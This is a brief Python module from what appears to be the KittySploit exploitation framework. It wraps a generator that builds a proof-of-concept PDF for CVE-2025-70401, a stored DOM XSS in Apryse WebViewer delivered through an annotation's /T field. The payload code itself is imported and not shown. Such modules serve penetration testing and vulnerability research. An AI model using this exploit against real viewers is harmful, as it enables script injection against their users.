#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.viewer_cve import write_annot_author_xss


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2025-70401 Apryse Annotation XSS',
        "description": 'Generate PDF PoC for CVE-2025-70401: stored DOM XSS via Text annotation /T field in Apryse WebViewer (img callback).',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2025-70401'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2025-70401'],
        "tags": ['pdf', 'cve-2025-70401', 'xss', 'apryse', 'webviewer'],
    }

    PDF_GENERATORS = (
        write_annot_author_xss,
    )

    CVE_IDS = ['CVE-2025-70401']
    MODULE_TITLE = 'PDF CVE-2025-70401 Apryse Annotation XSS'

    def run(self):
        return self.run_pdf_cve()